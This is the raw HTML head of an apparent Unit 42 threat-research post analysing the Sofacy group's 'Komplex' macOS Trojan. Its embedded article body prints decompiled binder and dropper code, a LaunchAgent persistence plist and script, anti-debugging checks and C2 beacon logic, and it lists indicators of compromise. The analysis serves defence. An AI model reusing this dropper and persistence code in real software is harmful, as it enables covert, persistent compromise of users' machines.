
<!doctype html>
<html >
  <head>
  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <link rel="apple-touch-icon" sizes="180x180" href="https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v4/favicon/icon-Unit42-180x180.png">
	<link rel="icon" type="image/png" sizes="32x32" href="https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v4/favicon/icon-Unit42-32x32.png">
	<link rel="icon" type="image/png" sizes="16x16" href="https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v4/favicon/icon-Unit42-16x16.png">
	<link rel="manifest" href="https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v4/favicon/site.webmanifest">
	<link rel="mask-icon" href="https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v4/favicon/safari-pinned-tab.svg" color="#000000">
	<meta name="msapplication-TileColor" content="#000000">
	<meta name="theme-color" content="#000">
  <link rel="alternate" hreflang="en" href="https://unit42.paloaltonetworks.com/unit42-sofacys-komplex-os-x-trojan/" />
<link rel="alternate" hreflang="ja" href="https://unit42.paloaltonetworks.jp/unit42-sofacys-komplex-os-x-trojan/" />

	<!-- This site is optimized with the Yoast SEO plugin v15.2.1 - https://yoast.com/wordpress/plugins/seo/ -->
	<title>Sofacy’s ‘Komplex’ OS X Trojan</title>
	<meta name="description" content="The Sofacy group uses a variety of tools to target individuals in the aerospace industry running the OS X operating system." />
	<meta name="robots" content="index, follow, max-snippet:-1, max-image-preview:large, max-video-preview:-1" />
	<link rel="canonical" href="https://unit42.paloaltonetworks.com/unit42-sofacys-komplex-os-x-trojan/" />
	<meta property="og:locale" content="en_US" />
	<meta property="og:type" content="article" />
	<meta property="og:title" content="Sofacy’s ‘Komplex’ OS X Trojan" />
	<meta property="og:description" content="The Sofacy group uses a variety of tools to target individuals in the aerospace industry running the OS X operating system." />
	<meta property="og:url" content="https://unit42.paloaltonetworks.com/unit42-sofacys-komplex-os-x-trojan/" />
	<meta property="og:site_name" content="Unit42" />
	<meta property="article:published_time" content="2016-09-26T08:00:01+00:00" />
	<meta property="article:modified_time" content="2018-11-01T10:23:28+00:00" />
	<meta property="og:image" content="https://unit42.paloaltonetworks.com/wp-content/uploads/2016/09/blog-web-banner-650x300.jpg" />
	<meta property="og:image:width" content="650" />
	<meta property="og:image:height" content="300" />
	<meta name="twitter:card" content="summary_large_image" />
	<meta name="twitter:label1" content="Written by">
	<meta name="twitter:data1" content="Dani Creus">
	<meta name="twitter:label2" content="Est. reading time">
	<meta name="twitter:data2" content="13 minutes">
	<script type="application/ld+json" class="yoast-schema-graph">{"@context":"https://schema.org","@graph":[{"@type":"WebSite","@id":"https://unit42.paloaltonetworks.com/#website","url":"https://unit42.paloaltonetworks.com/","name":"Unit42","description":"Palo Alto Networks","potentialAction":[{"@type":"SearchAction","target":"https://unit42.paloaltonetworks.com/?s={search_term_string}","query-input":"required name=search_term_string"}],"inLanguage":"en-US"},{"@type":"ImageObject","@id":"https://unit42.paloaltonetworks.com/unit42-sofacys-komplex-os-x-trojan/#primaryimage","inLanguage":"en-US","url":"https://unit42.paloaltonetworks.com/wp-content/uploads/2016/09/blog-web-banner-650x300.jpg","width":650,"height":300},{"@type":"WebPage","@id":"https://unit42.paloaltonetworks.com/unit42-sofacys-komplex-os-x-trojan/#webpage","url":"https://unit42.paloaltonetworks.com/unit42-sofacys-komplex-os-x-trojan/","name":"Sofacy\u2019s \u2018Komplex\u2019 OS X Trojan","isPartOf":{"@id":"https://unit42.paloaltonetworks.com/#website"},"primaryImageOfPage":{"@id":"https://unit42.paloaltonetworks.com/unit42-sofacys-komplex-os-x-trojan/#primaryimage"},"datePublished":"2016-09-26T08:00:01+00:00","dateModified":"2018-11-01T10:23:28+00:00","author":{"@id":"https://unit42.paloaltonetworks.com/#/schema/person/fb0754b44d250f6f8b6a8b1f77395b0c"},"description":"The Sofacy group uses a variety of tools to target individuals in the aerospace industry running the OS X operating system.","inLanguage":"en-US","potentialAction":[{"@type":"ReadAction","target":["https://unit42.paloaltonetworks.com/unit42-sofacys-komplex-os-x-trojan/"]}]},{"@type":"Person","@id":"https://unit42.paloaltonetworks.com/#/schema/person/fb0754b44d250f6f8b6a8b1f77395b0c","name":"Dani Creus","image":{"@type":"ImageObject","@id":"https://unit42.paloaltonetworks.com/#personlogo","inLanguage":"en-US","url":"https://unit42.paloaltonetworks.com/wp-content/uploads/2018/11/unit-news-meta.svg","caption":"Dani Creus"}}]}</script>
	<!-- / Yoast SEO plugin. -->


<link rel='dns-prefetch' href='//www.google.com' />
<link rel='dns-prefetch' href='//s.w.org' />
<link rel="alternate" type="application/rss+xml" title="Unit42 &raquo; Sofacy’s ‘Komplex’ OS X Trojan Comments Feed" href="https://unit42.paloaltonetworks.com/unit42-sofacys-komplex-os-x-trojan/feed/" />
<meta property="og:likes" content="0"/>
<meta property="og:readtime" content="10"/>
<meta property="og:views" content="46,363"/>
<meta property="og:date_created" content="September 26, 2016 at 11:00 AM"/>
<meta property="og:post_length" content="3158"/>
<meta property="og:category" content="Unit 42"/>
<meta property="og:category_link" content="https://unit42.paloaltonetworks.com/category/unit42/"/>
<meta property="og:author" content="Dani Creus"/>
<meta property="og:author" content="Tyler Halfpop"/>
<meta property="og:author" content="Robert Falcone"/>
<meta property="og:authorlink" content="https://unit42.paloaltonetworks.com/author/dani-creus/"/>
<meta property="og:authorlink" content="https://unit42.paloaltonetworks.com/author/tyler-halfpop/"/>
<meta property="og:authorlink" content="https://unit42.paloaltonetworks.com/author/robertfalcone/"/>
<meta property="og:author_image_link" content="https://unit42.paloaltonetworks.com/wp-content/uploads/2018/11/unit-news-meta.svg"/>
<meta property="og:author_image_link" content="https://unit42.paloaltonetworks.com/wp-content/uploads/2018/11/unit-news-meta.svg"/>
<meta property="og:author_image_link" content="https://unit42.paloaltonetworks.com/wp-content/uploads/2018/11/unit-news-meta.svg"/>
<script type="application/ld+json">{"@context":"https:\/\/schema.org","@type":"BlogPosting","headline":"Sofacy\u2019s \u2018Komplex\u2019 OS X Trojan","name":"Sofacy\u2019s \u2018Komplex\u2019 OS X Trojan","description":"This post is also available in: \u65e5\u672c\u8a9e (Japanese)Unit 42 researchers identified a new OS X Trojan associated with the Sofacy group that we are now tracking with the 'Komplex' tag using the Palo Alto Networks AutoFocus threat intelligence platform. The Sofacy group, also known as APT28, Pawn Storm, Fancy Bear, and Sednit, continues to add...","url":"https:\/\/unit42.paloaltonetworks.com\/unit42-sofacys-komplex-os-x-trojan\/","mainEntityOfPage":"https:\/\/unit42.paloaltonetworks.com\/unit42-sofacys-komplex-os-x-trojan\/","datePublished":"September 26, 2016","articleBody":"Unit 42 researchers identified a new OS X Trojan associated with the Sofacy group that we are now tracking with the 'Komplex' tag using the Palo Alto Networks AutoFocus threat intelligence platform.\r\n\r\nThe Sofacy group, also known as APT28, Pawn Storm, Fancy Bear, and Sednit, continues to add to the variety of tools they use in attacks; in this case, targeting individuals in the aerospace industry running the OS X operating system. During our analysis, we determined that Komplex was used in a previous attack campaign targeting individuals running OS X that exploited a vulnerability in the MacKeeper antivirus application to deliver Komplex as a payload. Komplex shares a significant amount of functionality and traits with another tool used by Sofacy - the Carberp variant that Sofacy had used in previous attack campaigns on systems running Windows. In addition to shared code and functionality, we also discovered Komplex command and control (C2) domains that overlapped with previously identified phishing campaign infrastructures associated with the Sofacy group.\r\nKomplex Binder\r\nKomplex is a Trojan that the Sofacy group created to compromise individuals using OS X devices. The Trojan has multiple parts, first leading with a binder component that is responsible for saving a second payload and a decoy document to the system. We found three different versions of the Komplex binder, one that was created to run on x86, another on x64, and a third that contained binders for both x86 and x64 architectures. We found the following samples of the Komplex binder:\r\n2a06f142d87bd9b66621a30088683d6fcec019ba5cc9e5793e54f8d920ab0134: Mach-O 64-\r\nbit executable x86_64\r\nc1b8fc00d815e777e39f34a520342d1942ebd29695c9453951a988c61875bcd7: Mach-O \r\nexecutable i386\r\ncffa1d9fc336a1ad89af90443b15c98b71e679aeb03b3a68a5e9c3e7ecabc3d4: Mach-O \r\nuniversal binary with 2 architectures\r\nRegardless of architecture, these initial binders all save a second embedded Mach-O file to \u2018\/tmp\/content\u2019. This file is the Komplex dropper used in the next stage of installation and to maintain persistence. After saving the Komplex dropper, these binders would then save a legitimate decoy document to the system and open them using the \u2018Preview\u2019 application to minimize suspicion of any malicious activity. Figure 1 shows the main function found in one of the initial droppers that saves and opens a PDF decoy, as well as executes another executable file saved as \u2018\/tmp\/content\u2019.\r\nint _main(int arg0, int arg1) {\r\n    var_28 = [[NSAutoreleasePool alloc] init];\r\n    var_38 = [NSSearchPathForDirectoriesInDomains(0xf, 0x1, 0x1) objectAtIndex:0x0];\r\n    var_40 = [NSString stringWithFormat:@\"%@\/roskosmos_2015-2025.pdf\", var_38];\r\n    var_48 = [NSString stringWithFormat:@\"SetFile -a E %@\/roskosmos_2015-2025.pdf\", \r\nvar_38];\r\n    var_50 = [NSString stringWithFormat:@\"rm -rf %@\/roskosmos_2015-2025.app\", var_38];\r\n    var_58 = [NSString stringWithFormat:@\"open -a Preview.app %@\/roskosmos_2015-\r\n2025.pdf\", var_38];\r\n    [[NSData dataWithBytes:_joiner length:0x20f74] writeToFile:@\"\/tmp\/content\" \r\natomically:0x1];\r\n    system([var_50 UTF8String]);\r\n    system(\"chmod 755 \/tmp\/content\");\r\n    [[NSData dataWithBytes:_pdf length:0x182c82] writeToFile:var_40 atomically:0x1];\r\n    system([var_48 UTF8String]);\r\n    var_70 = [[NSTask alloc] init];\r\n    [var_70 setLaunchPath:@\"\/tmp\/content\"];\r\n    [var_70 launch];\r\n    [var_70 waitUntilExit];\r\n    system([var_58 UTF8String]);\r\n    remove(*arg1);\r\n    [var_28 release];\r\n    return 0x0;\r\n}\r\n\r\nFigure 1 Main function within the Komplex binder\r\nThe binder component saves a decoy document named roskosmos_2015-2025.pdf to the system and opens it using the Preview application built into OS X. Figure 2 shows a portion of the 17 page decoy document. This document is titled \u201c\u041f\u0440\u043e\u0435\u043a\u0442 \u0424\u0435\u0434\u0435\u0440\u0430\u043b\u044c\u043d\u043e\u0439 \u043a\u043e\u0441\u043c\u0438\u0447\u0435\u0441\u043a\u043e\u0439 \u043f\u0440\u043e\u0433\u0440\u0430\u043c\u043c\u044b \u0420\u043e\u0441\u0441\u0438\u0438 \u043d\u0430 2016 - 2025 \u0433\u043e\u0434\u044b\u201d and describes the Russian Federal Space Program\u2019s projects between 2016 and 2025. We do not have detailed targeting information regarding the\u00a0 Sofacy group's attack campaign delivering Komplex at this time; however, based on the contents of the decoy document, we believe that the target is likely associated with the aerospace industry.\r\n\r\nFigure 2 Decoy document opened by Komplex binder showing document regarding the Russian Space Program\r\n\r\nKomplex Dropper\r\nThe Komplex dropper component is saved to the system as \u201c\/tmp\/content\u201d (SHA256: 96a19a90caa41406b632a2046f3a39b5579fbf730aca2357f84bf23f2cbc1fd3) and is responsible for installing a third executable to the system and setting up persistence for the third executable to launch each time the OS X operating system starts. This dropper also provided the basis for the name \u201cKomplex\u201d, which is seen in several folder paths that were included within the Mach-O file, such as \u201c\/Users\/kazak\/Desktop\/Project\/komplex\".\r\n\r\nThe Komplex dropper is fairly straightforward from a functional perspective, as it contains all of its functionality within its \u201c_main\u201d function. The \u201c_main\u201d function (Figure 3) accesses data within three variables named \u2018_Payload_1\u2019, \u2018_Payload_2\u2019 and \u2018_Payload_3\u2019, and writes them to three files on the system.\r\nint _main(int arg0, int arg1) {\r\n    var_38 = [[NSAutoreleasePool alloc] init];\r\n    var_40 = [NSData dataWithBytes:_Payload_1 length:0x15c1c];\r\n    var_48 = [NSData dataWithBytes:_Payload_2 length:0x201];\r\n    var_50 = [NSData dataWithBytes:_Payload_3 length:0x4c];\r\n    system(\"mkdir -p \/Users\/Shared\/.local\/ &amp;&gt; \/dev\/null\");\r\n    system(\"mkdir -p ~\/Library\/LaunchAgents\/ &amp;&gt; \/dev\/null\");\r\n    [var_40 writeToFile:@\"\/Users\/Shared\/.local\/kextd\" atomically:0x1];\r\n    [var_48 writeToFile:@\"\/Users\/Shared\/com.apple.updates.plist\" \r\natomically:0x1];\r\n    [var_50 writeToFile:@\"\/Users\/Shared\/start.sh\" atomically:0x1];\r\n    system(\"cp \/Users\/Shared\/com.apple.updates.plist \r\n$HOME\/Library\/LaunchAgents\/  &amp;&gt;\/dev\/null\");\r\n    remove(\"\/Users\/Shared\/com.apple.updates.plist\");\r\n    system(\"chmod 755 \/Users\/Shared\/.local\/kextd\");\r\n    system(\"chmod 755 \/Users\/Shared\/start.sh\");\r\n    var_58 = [[NSTask alloc] init];\r\n    [var_58 setLaunchPath:@\"\/Users\/Shared\/start.sh\"];\r\n    [var_58 launch];\r\n    [var_58 waitUntilExit];\r\n    remove(\"\/Users\/Shared\/start.sh\");\r\n    remove(*arg1);\r\n    [var_38 release];\r\n    return 0x0;\r\n}\r\n\r\nFigure 3 Komplex Dropper's main function that drops three files to the system and runs a shell script\r\nThe \u201c_main\u201d function writes the data within \u2018_Payload_1\u2019, \u2018_Payload_2\u2019, and \u2018_Payload_3\u2019 variables to the following files, respectively:\r\n\r\n \t\/Users\/Shared\/.local\/kextd (SHA256:\r\n227b7fe495ad9951aebf0aae3c317c1ac526cdd255953f111341b0b11be3bbc5)\r\n \t\/Users\/Shared\/com.apple.updates.plist (SHA256:\r\n1f22e8f489abff004a3c47210a9642798e1c53efc9d6f333a1072af4b11d71ef)\r\n \t\/Users\/Shared\/start.sh (SHA256:\r\nd494e9f885ad2d6a2686424843142ddc680bb5485414023976b4d15e3b6be800)\r\n\r\nThe shell script saved to \u2018\/Users\/Shared\/start.sh\u2019 calls the system command \u2018launchctl\u2019 to add a plist entry into \u2018launchd\u2019 to automatically execute the Komplex payload each time the system starts. Figure 4 shows the contents of the \u2018start.sh\u2019 script that sets up persistence for the payload.\r\n#!\/bin\/sh\r\nlaunchctl load -w ~\/Library\/LaunchAgents\/com.apple.updates.plist\r\n\r\nFigure 4 Contents of the start.sh shell script that calls launchctl\r\nThe \u2018start.sh\u2019 script loads \u2018com.apple.updates.plist\u2019, which sets the properties of the Komplex payload that is executed from \u201c\/Users\/Shared\/.local\/kextd\u201d at system start up courtesy of the \u201cRunAtLoad\u201d parameter. \u00a0Figure 5 shows the contents of the \u2018com.apple.updates.plist\u2019 file loaded into \u2018launchd\u2019.\r\n&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;\r\n&lt;!DOCTYPE plist PUBLIC \"-\/\/Apple\/\/DTD PLIST 1.0\/\/EN\" \r\n\"http:\/\/www.apple.com\/DTDs\/PropertyList-1.0.dtd\"&gt;\r\n&lt;plist version=\"1.0\"&gt;\r\n&lt;dict&gt;\r\n\t&lt;key&gt;Label&lt;\/key&gt;\r\n\t&lt;string&gt;com.apple.updates&lt;\/string&gt;\r\n\t&lt;key&gt;ProgramArguments&lt;\/key&gt;\r\n\t&lt;array&gt;\r\n\t\t&lt;string&gt;\/Users\/Shared\/.local\/kextd&lt;\/string&gt;\r\n\t&lt;\/array&gt;\r\n\t&lt;key&gt;KeepAlive&lt;\/key&gt;\r\n\t&lt;false\/&gt;\r\n\t&lt;key&gt;RunAtLoad&lt;\/key&gt;\r\n\t&lt;true\/&gt;\r\n\t&lt;key&gt;StandardErrorPath&lt;\/key&gt;\r\n\t&lt;string&gt;\/dev\/null&lt;\/string&gt;\r\n\t&lt;key&gt;StandardOutPath&lt;\/key&gt;\r\n\t&lt;string&gt;\/dev\/null&lt;\/string&gt;\r\n&lt;\/dict&gt;\r\n&lt;\/plist&gt;\r\n\r\nFigure 5 Contents of the com.apple.updates.plist file showing how the dropper achieves persistence\r\n\r\nKomplex Payload\r\nThe ultimate purpose of the aforementioned components is to install and execute the Komplex payload. The dropper component saves the payload to \"\/Users\/Shared\/.local\/kextd\" (SHA256: 227b7fe495ad9951aebf0aae3c317c1ac526cdd255953f111341b0b11be3bbc5) and ultimately executes the payload. The payload begins by conducting an anti-debugging check to see if it is being debugged before proceeding with executing its main functionality, which can be seen in the \u201cAmIBeingDebugged\u201d function in Figure 6. The \u201cAmIBeingDebugged\u201d function uses the \u201csysctl\u201d function to check to see if a specific \u201cP_TRACED\u201d flag is set, which signifies that the process is being debugged. A particularly interesting part of this function is that it is very similar to the function provided by Apple to its developers in a guide created in 2004 titled \u201cDetecting the Debugger\u201d. This is not the first time the Sofacy group's malware authors have obtained techniques from publicly available sources, as demonstrated in the use of the Office Test Persistence Method that they obtained from a blog posted in 2014.\r\nint AmIBeingDebugged()() {\r\n    var_8 = **__stack_chk_guard;\r\n    getpid();\r\n    if ((((sysctl(0x1, 0x4, var_2A8, 0x288, 0x0, 0x0) == 0x0 ? 0x1 : 0x0) ^ 0x1) &amp; 0x1 \r\n&amp; 0xff) != 0x0) {\r\n            rax = __assert_rtn(\"AmIBeingDebugged\", \r\n\"\/Users\/user\/Desktop\/LoaderWinApi\/LoaderWinApi\/main.mm\", 0x21, \"junk == 0\");\r\n    }\r\n    else {\r\n            var_2C1 = (0x0 &amp; 0x800) != 0x0 ? 0x1 : 0x0;\r\n            if (**__stack_chk_guard == var_8) {\r\n                    rax = var_2C1 &amp; 0x1 &amp; 0xff;\r\n            }\r\n            else {\r\n                    rax = __stack_chk_fail();\r\n            }\r\n    }\r\n    return rax;\r\n}\r\n\r\nFigure 6 The AmIBeingDebugged function used as an anti-analysis technique\r\nAfter determining that it is not running in a debugger, the payload performs an anti-analysis\/sandbox check by issuing a GET request to Google, to check for Internet connectivity. The payload will sleep until it receives a response from the HTTP requests to Google, which means Komplex will only communicate to its C2 servers in Internet enabled environments. Figure 7 shows the \u201cconnectedToInternet\u201d function that confirms whether the payload is able to communicate with \u201chttp:\/\/www.google.com\u201d before carrying out its functionality.\r\nint connectedToInternet()() {\r\n    if ([NSData dataWithContentsOfURL:[NSURL \r\nURLWithString:@\"http:\/\/www.google.com\"]] != 0x0) {\r\n            var_1 = 0x1;\r\n    }\r\n    else {\r\n            var_1 = 0x0;\r\n    }\r\n    rax = var_1 &amp; 0x1 &amp; 0xff;\r\n    return rax;\r\n}\r\n\r\nFigure 7 The connectedToInternet function testing for an active Internet connection\r\nAfter confirming an active Internet connection, the Komplex payload begins carrying out its main functionality. The Komplex payload uses an 11-byte XOR algorithm to decrypt strings used for configuration and within C2 communications, including the C2 domains themselves. Figure 8 shows a screenshot of Komplex\u2019s custom string decryption algorithm, along with the XOR key used to decrypt strings within the payload.\r\n\r\nFigure 8 11-byte XOR algorithm used by Komplex to decrypt configuration strings\r\nThe algorithm seen in Figure 8 decrypts the strings seen in Table 1, which the payload references using the associated variable names. The payload uses these decrypted strings for a variety of purposes, such as command parsing and C2 server locations.\r\n\r\n\r\n\r\n\r\n\r\n\r\nVariable Name\r\nDecrypted String\r\n\r\n\r\nFILE_NAME\r\nFileName\r\n\r\n\r\nPATHTOSAVE\r\nPathToSave\r\n\r\n\r\nSTART_BLOCK_FILE\r\n[file]\r\n\r\n\r\nBLOCK_EXECUTE\r\nExecute\r\n\r\n\r\nBLOCK_DELETE\r\nDelete\r\n\r\n\r\nEND_BLOCK_FILE\r\n[\/file]\r\n\r\n\r\nSERVERS\r\nappleupdate[.]org, apple-iclouds[.]net, itunes-helper[.]net\r\n\r\n\r\nMAC\r\nmac\r\n\r\n\r\nCONFIG\r\nconfig\r\n\r\n\r\nGET_CONFIG\r\n1\r\n\r\n\r\nFILES\r\nfile\r\n\r\n\r\nLOG\r\nlog\r\n\r\n\r\nOLD_CONFIG\r\n2\r\n\r\n\r\nID\r\nid\r\n\r\n\r\nTOKEN\r\nh8sn3vq6kl\r\n\r\n\r\nEXTENSIONS\r\n.xml .pdf, .htm, .zip\r\n\r\n\r\n\r\n\r\n\r\nTable 1 Strings decrypted by Komplex and their referenced name\r\nThe Komplex payload uses the SERVERS variable to obtain the location of its C2, which it communicates with using HTTP POST requests. The payload generates a URL to communicate with its C2 server that has the following structure:\r\n\r\n\/&lt;random path&gt;\/&lt;random string&gt;.&lt;chosen extension&gt;\/?&lt;random string&gt;=&lt;encrypted token&gt;\r\n\r\nThe &lt;chosen extension&gt; portion of the URL is chosen at random from the list of legitimate file extensions: .xml, .zip, .htm and .pdf. The &lt;encrypted token&gt; within the parameters of the URL is base64 encoded ciphertext created from the string \u2018h8sn3vq6kl\u2019. The ciphertext of the string is generated via a custom algorithm that uses a random 4-byte integer as a key that is modified by XOR with the static value 0xE150722. The payload also encrypts the data sent within the POST request using the same algorithm and encodes it using base64. Figure 9 below shows an example HTTP POST sent from the payload to its C2 server.\r\n\r\n\r\nFigure 9 Beacon sent from Komplex to C2 containing system information within the HTTP POST data\r\nThe HTTP POST data in Figure 9 is comprised of information that the malware collects from the infected system. The system information sent to the C2 includes data such as the system version, username, and process list, which is gathered within a function named \u201cgetOsInfo\u201d within the \u201cInfoOS\u201d class (Figure 10).\r\nint InfoOS::getOsInfo()() {\r\n    var_38 = rdi;\r\n    var_18 = [[NSProcessInfo processInfo] operatingSystemVersionString];\r\n    var_20 = NSUserName();\r\n    var_28 = InfoOS::getProcessList();\r\n    var_30 = operator new[](strlen(var_28) + 0x200);\r\n    sprintf(var_30, \"Mac OS X - %s %s\\nUser name - %s\\n\\t\\t\\t\\t\\t\\tProcess \r\nlist :\\n\\n%s\", [var_18 UTF8String], InfoOS::bitOS(), [var_20 UTF8String], \r\nvar_28);\r\n    rax = var_30;\r\n    return rax;\r\n}\r\n\r\nFigure 10 getOsInfo function within Komplex that gathers system information for C2 beacon\r\nThe Sofacy C2 server will respond to this HTTP request with encrypted data that the payload will decrypt using the same custom algorithm used to encrypt the POST data. The Komplex payload will parse the C2 response for the following strings: \"[file]\" and \"[\/file]\", \"FileName=\", \"PathToSave=\", \"Shell=\", \"Execute\", and \"Delete\". The \"Delete\" action does nothing more than delete a file specified by 'PathToSave'\/'FileName', whereas the \"Execute\" action involves running the following system commands before executing the specified file:\r\nmkdir -p &lt;'PathToSave'&gt; &amp;&gt; \/dev\/null\r\nchmod 755 &lt;'PathToSave'&gt;\/&lt;'FileName'&gt; &amp;&gt; \/dev\/null\r\n\r\nThe payload will treat \"[file]\" and \"[\/file]\" as delimiters that specify the data that the payload should write to a specified file, which allows the threat actor to download additional files to the system. Lastly, the payload can execute commands on the compromised system specified within the \"Shell\" field, which the payload will execute and then send results back to the C2.\r\nConnections to Sofacy and Previous Attacks.\r\nCode Overlaps\r\n\r\nWhile reverse engineering the Komplex payload, we came across a few code overlaps that we believed were worth exploring. First, we noticed striking similarities between the Komplex payload and the traits and behavior of an OS X Trojan discussed in a BAE Systems blog titled NEW MAC OS MALWARE EXPLOITS MACKEEPER. According to this blog post, an OS X Trojan was delivered via a vulnerability in the MacKeeper application. The nameless OS X Trojan uses an 11-byte XOR algorithm to decrypt an embedded configuration, which has all of the same variable names and values as the Komplex sample (see Table 1). The algorithm used to encrypt and decrypt the network traffic, as well as all static elements of the network communications (composition of URL, structure of HTTP data, command parsing procedure, etc.) discussed in the blog post are the exact same as seen in the Komplex payload. These overlaps suggest that the Trojan delivered by the MacKeeper vulnerability was in fact the Komplex Trojan.\r\n\r\nThe second code overlap ties the Komplex Trojan to Sofacy\u2019s Carberp variant, which we have analyzed in previous research efforts. Even though Komplex was created to run on OS X and Sofacy\u2019s Carberp variant was developed to run on Windows, they share many commonalities, including:\r\n\r\n \tSame URL generation logic using random path values, a random file extension and encrypted token\r\n \tSame file extensions used in C2 URL that are listed within the binaries in the same order\r\n \tSame algorithm used to encrypt and decrypt the token in the URL and HTTP POST data (Carberp key is modified using value 0xAA7D756 whereas Komplex uses 0xE150722)\r\n \tVery similar command handling, including parsing specifically for Execute, Delete, [file], [\/file], FileName, and PathToSave.\r\n \tChecks for Internet connectivity by connecting to google.com\r\n \tUses an 11-byte XOR key to decrypt strings within the configuration\r\n\r\nIn addition to these common traits, we found a Sofacy Carberp variant (SHA256: 638e7ca68643d4b01432f0ecaaa0495b805cc3cccc17a753b0fa511d94a22bdd) using the same TOKEN value of \u2018h8sn3vq6kl\u2019 within its C2 URL, as observed in Komplex payloads. Based on these observations, we believe that the author of Sofacy\u2019s Carberp variant used the same code, or at least the same design, to create the Komplex Trojan. A benefit of retaining many of the same functionalities within the Windows and OS X Trojans is that it would require fewer alterations to the C2 server application to handle cross-platform implants.\r\n\r\nInfrastructure Overlap\r\n\r\nWhile Komplex\u2019s C2 domain appleupdate[.]org does not appear to have any previously known activity associated with it, both the apple-iclouds[.]net and itunes-helper[.]net domains have direct ties to Sofacy activity. The apple-iclouds[.]net domain is mentioned within a PwC Tactical Intelligence Bulletin that discussed a phishing campaign conducted by the Sofacy group. The itunes-helper[.]net domain is associated with separate activity discussed in Trend Micro\u2019s blog titled Looking Into a Cyber-Attack Facilitator in the Netherlands that included research on hosting providers used by Pawn Storm (Sofacy).\r\n\r\nThe domain appleupdate[.]org does have one interesting correlation point, specifically involving the IP 185.10.58[.]170 that resolved this domain between April 2015 through April 2016. Researchers at BAE Systems provided Unit 42 the Komplex payload delivered through the exploitation of MacKeeper (Dropper SHA256: da43d39c749c121e99bba00ce809ca63794df3f704e7ad4077094abde4cf2a73 and Payload SHA256: 45a93e4b9ae5bece0d53a3a9a83186b8975953344d4dfb340e9de0015a247c54), which used the IP address 185.10.58[.]170 within its configuration as a C2 server. This infrastructure overlap further strengthens the connection between the Komplex payload we discovered with the prior campaign using MacKeeper for delivery.\r\nConclusion\r\nThe Sofacy group created the Komplex Trojan to use in attack campaigns targeting the OS X operating system \u2013 a move that showcases their continued evolution toward multi-platform attacks. The tool is capable of downloading additional files to the system, executing and deleting files, as well as directly interacting with the system shell. While detailed targeting information is not currently available, we believe Komplex has been used in attacks on individuals related to the aerospace industry, as well as attacks leveraging an exploit in MacKeeper to deliver the Trojan. The Komplex Trojan revealed a design similar to Sofacy\u2019s Carberp variant Trojan, which we believe may have been done in order to handle compromised Windows and OS X systems using the same C2 server application with relative ease.\r\n\r\nWhile Unit 42 continues to research and track this threat, Palo Alto Networks customers are protected via the following:\r\n\r\n \tWildFire correctly identifies known Komplex executables as malicious\r\n \tIPS signature #14442 Sofacy.Gen Command And Control Traffic can detect and block outbound C2 requests generated by the Komplex Trojan.\r\n \tCustomers can track this Trojan via the Komplex tag in AutoFocus.\r\n\r\nIOCs:\r\nHashes:\r\n2a06f142d87bd9b66621a30088683d6fcec019ba5cc9e5793e54f8d920ab0134\r\nc1b8fc00d815e777e39f34a520342d1942ebd29695c9453951a988c61875bcd7\r\ncffa1d9fc336a1ad89af90443b15c98b71e679aeb03b3a68a5e9c3e7ecabc3d4\r\n96a19a90caa41406b632a2046f3a39b5579fbf730aca2357f84bf23f2cbc1fd3\r\n227b7fe495ad9951aebf0aae3c317c1ac526cdd255953f111341b0b11be3bbc5\r\n45a93e4b9ae5bece0d53a3a9a83186b8975953344d4dfb340e9de0015a247c54\r\n\r\nC2 Locations:\r\nappleupdate[.]org\r\napple-iclouds[.]net\r\nitunes-helper[.]net\r\n185.10.58.170","publisher":{"@type":"Organization","@id":"#panworg"},"image":{"@type":"ImageObject","url":"https:\/\/unit42.paloaltonetworks.com\/wp-content\/uploads\/2016\/09\/blog-web-banner-650x300-150x150.jpg","width":150,"height":150},"author":[{"@type":"Person","name":"Dani Creus"},{"@type":"Person","name":"Tyler Halfpop"},{"@type":"Person","name":"Robert Falcone"}]}</script><link rel='stylesheet' id='crayon-css'  href='https://unit42.paloaltonetworks.com/wp-content/plugins/crayon-syntax-highlighter/css/min/crayon.min.css?ver=_2.7.2_beta' type='text/css' media='all' />
<link rel='stylesheet' id='crayon-theme-classic-css'  href='https://unit42.paloaltonetworks.com/wp-content/plugins/crayon-syntax-highlighter/themes/classic/classic.css?ver=_2.7.2_beta' type='text/css' media='all' />
<link rel='stylesheet' id='crayon-font-monaco-css'  href='https://unit42.paloaltonetworks.com/wp-content/plugins/crayon-syntax-highlighter/fonts/monaco.css?ver=_2.7.2_beta' type='text/css' media='all' />
<link rel='stylesheet' id='wp-block-library-css'  href='https://unit42.paloaltonetworks.com/wp-includes/css/dist/block-library/style.min.css?ver=5.4.1' type='text/css' media='all' />
<link rel='stylesheet' id='dashicons-css'  href='https://unit42.paloaltonetworks.com/wp-includes/css/dashicons.min.css?ver=5.4.1' type='text/css' media='all' />
<link rel='stylesheet' id='post-views-counter-frontend-css'  href='https://unit42.paloaltonetworks.com/wp-content/plugins/post-views-counter/css/frontend.css?ver=1.3.2' type='text/css' media='all' />
<link rel='stylesheet' id='wpml-legacy-horizontal-list-0-css'  href='//unit42.paloaltonetworks.com/wp-content/plugins/sitepress-multilingual-cms/templates/language-switchers/legacy-list-horizontal/style.css?ver=1' type='text/css' media='all' />
<link rel='stylesheet' id='wpml-legacy-post-translations-0-css'  href='//unit42.paloaltonetworks.com/wp-content/plugins/sitepress-multilingual-cms/templates/language-switchers/legacy-post-translations/style.css?ver=1' type='text/css' media='all' />
<link rel='stylesheet' id='wordpress-popular-posts-css-css'  href='https://unit42.paloaltonetworks.com/wp-content/plugins/wordpress-popular-posts/assets/css/wpp.css?ver=5.2.4' type='text/css' media='all' />
<link rel='stylesheet' id='unit42/css-css'  href='https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v4/dist/styles/main.css' type='text/css' media='all' />
<script type='text/javascript' src='https://unit42.paloaltonetworks.com/wp-includes/js/jquery/jquery.js?ver=1.12.4-wp'></script>
<script type='text/javascript' src='https://unit42.paloaltonetworks.com/wp-includes/js/jquery/jquery-migrate.min.js?ver=1.4.1'></script>
<script type='text/javascript'>
/* <![CDATA[ */
